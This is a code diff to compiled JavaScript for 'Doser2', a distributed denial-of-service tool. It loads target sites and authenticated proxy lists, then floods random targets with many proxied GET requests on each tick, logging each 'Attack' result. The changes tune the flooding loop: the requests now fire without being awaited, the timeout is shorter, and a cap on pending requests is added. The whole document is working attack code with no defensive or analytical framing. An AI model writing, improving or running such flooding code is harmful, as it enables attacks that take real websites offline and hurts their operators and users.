@@ -42,16 +42,19 @@ Object.defineProperty(exports, "__esModule", { value: true });
 exports.Doser2 = void 0;
 var axios_https_proxy_fix_1 = __importDefault(require("axios-https-proxy-fix"));
 var events_1 = require("events");
+var lodash_1 = __importDefault(require("lodash"));
 var Doser2 = /** @class */ (function () {
     function Doser2() {
         var _this = this;
         this.loadedTargetsAndProxies = null;
+        // private compactRequestsArrayInterval?: NodeJS.Timer;
         // Attack settings
         this.onlyProxy = true;
         this.sitesPerTickCount = 10; // How many sites we attack each interval
         this.tickingIntervalTime = 60;
         this.attacksPerSite = 10; //Attacks per site from different proxies
         this.randomStartTimeInterval = 100; // Setting used when you create many instances, additional interval before start
+        this.maxRequestCount = 1000;
         this.requestsPromises = [];
         this.working = false;
         this.eventSource = new events_1.EventEmitter();
@@ -61,6 +64,10 @@ var Doser2 = /** @class */ (function () {
         this.targetsAndProxiesInterval = setInterval(function () {
             _this.updateTargetsAndProxies();
         }, 300000);
+        // //Clear all false values(null, undefine, .etc)
+        // this.compactRequestsArrayInterval = setInterval(() => {
+        //   this.requestsPromises = _.compact(this.requestsPromises);
+        // }, 10000);
     }
     Doser2.prototype.updateTargetsAndProxies = function () {
         var _this = this;
@@ -69,6 +76,13 @@ var Doser2 = /** @class */ (function () {
             _this.loadedTargetsAndProxies = data;
         })
             .catch(function () { return console.log('Unable to update data'); });
+    };
+    /**
+     * Remove requests that finished its work
+     * @private
+     */
+    Doser2.prototype.clearRequests = function () {
+        this.requestsPromises = lodash_1.default.compact(this.requestsPromises);
     };
     Doser2.prototype.forceProxy = function (newVal) {
         this.onlyProxy = newVal;
@@ -126,68 +140,69 @@ var Doser2 = /** @class */ (function () {
     Doser2.prototype.tick = function () {
         return __awaiter(this, void 0, void 0, function () {
             var _a, sites, proxies, _loop_1, this_1, i;
+            var _this = this;
             return __generator(this, function (_b) {
-                switch (_b.label) {
-                    case 0:
-                        if (!this.loadedTargetsAndProxies) {
-                            return [2 /*return*/];
-                        }
-                        _a = this.loadedTargetsAndProxies, sites = _a.sites, proxies = _a.proxies;
-                        if (!this.working) return [3 /*break*/, 2];
-                        _loop_1 = function (i) {
-                            var randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
-                            var _loop_2 = function (j) {
-                                // Use random proxy for each request
-                                var randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
-                                var proxyAddressSplit = randomProxy.ip.split(':');
-                                var proxyIP = proxyAddressSplit[0];
-                                var proxyPort = parseInt(proxyAddressSplit[1]);
-                                var proxyAuthSplit = randomProxy.auth.split(':');
-                                var proxyUsername = proxyAuthSplit[0];
-                                var proxyPassword = proxyAuthSplit[1];
-                                var promise = axios_https_proxy_fix_1.default.get(randomSite.page, {
-                                    timeout: 5000,
-                                    validateStatus: function () { return true; },
-                                    proxy: {
-                                        host: proxyIP,
-                                        port: proxyPort,
-                                        auth: {
-                                            username: proxyUsername,
-                                            password: proxyPassword
-                                        }
-                                    }
-                                });
-                                // Show some stats about it
-                                promise
-                                    .then(function (result) {
-                                    console.log("Attack: ".concat(randomSite.page, " | ").concat(result.status));
-                                    if (result.status === 407) {
-                                        console.log('Proxy requires auth: ', randomProxy);
-                                    }
-                                }).catch(function (e) {
-                                    console.log("Fail: ".concat(randomSite.page, " | ").concat(e.code));
-                                });
-                                this_1.requestsPromises.push(promise);
-                            };
-                            // Send few requests to the current target
-                            for (var j = 0; j < this_1.attacksPerSite; j++) {
-                                _loop_2(j);
-                            }
-                        };
-                        this_1 = this;
-                        for (i = 0; i < this.sitesPerTickCount; i++) {
-                            _loop_1(i);
-                        }
-                        // Execute all requests
-                        return [4 /*yield*/, Promise.all(this.requestsPromises)];
-                    case 1:
-                        // Execute all requests
-                        _b.sent();
-                        console.log('Request count: ', this.requestsPromises.length);
-                        this.requestsPromises = []; // Clear
-                        _b.label = 2;
-                    case 2: return [2 /*return*/];
+                if (!this.loadedTargetsAndProxies) {
+                    console.log('No target or proxies');
+                    return [2 /*return*/];
                 }
+                if (this.requestsPromises.length >= this.maxRequestCount) {
+                    console.log('Max count of pending requests reached: ', this.requestsPromises);
+                    this.clearRequests();
+                    return [2 /*return*/];
+                }
+                _a = this.loadedTargetsAndProxies, sites = _a.sites, proxies = _a.proxies;
+                if (this.working) {
+                    _loop_1 = function (i) {
+                        var randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
+                        var _loop_2 = function (j) {
+                            // Use random proxy for each request
+                            var randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
+                            var proxyAddressSplit = randomProxy.ip.split(':');
+                            var proxyIP = proxyAddressSplit[0];
+                            var proxyPort = parseInt(proxyAddressSplit[1]);
+                            var proxyAuthSplit = randomProxy.auth.split(':');
+                            var proxyUsername = proxyAuthSplit[0];
+                            var proxyPassword = proxyAuthSplit[1];
+                            var promise = axios_https_proxy_fix_1.default.get(randomSite.page, {
+                                timeout: 2000,
+                                validateStatus: function () { return true; },
+                                proxy: {
+                                    host: proxyIP,
+                                    port: proxyPort,
+                                    auth: {
+                                        username: proxyUsername,
+                                        password: proxyPassword
+                                    }
+                                }
+                            });
+                            var promiseIndex = this_1.requestsPromises.push(promise) - 1;
+                            // Show some stats about it
+                            promise
+                                .then(function (result) {
+                                console.log("Attack: ".concat(randomSite.page, " | ").concat(result.status));
+                                if (result.status === 407) {
+                                    console.log('Proxy requires auth: ', randomProxy);
+                                }
+                            }).catch(function (e) {
+                                console.log("Fail: ".concat(randomSite.page, " | ").concat(e.code));
+                            }).finally(function () {
+                                _this.requestsPromises[promiseIndex] = undefined;
+                            });
+                        };
+                        // Send few requests to the current target
+                        for (var j = 0; j < this_1.attacksPerSite; j++) {
+                            _loop_2(j);
+                        }
+                    };
+                    this_1 = this;
+                    for (i = 0; i < this.sitesPerTickCount; i++) {
+                        _loop_1(i);
+                    }
+                    console.log('Request count: ', this.requestsPromises.length);
+                    this.requestsPromises = []; // Clear
+                }
+                return [2 /*return*/];
             });
         });
     };
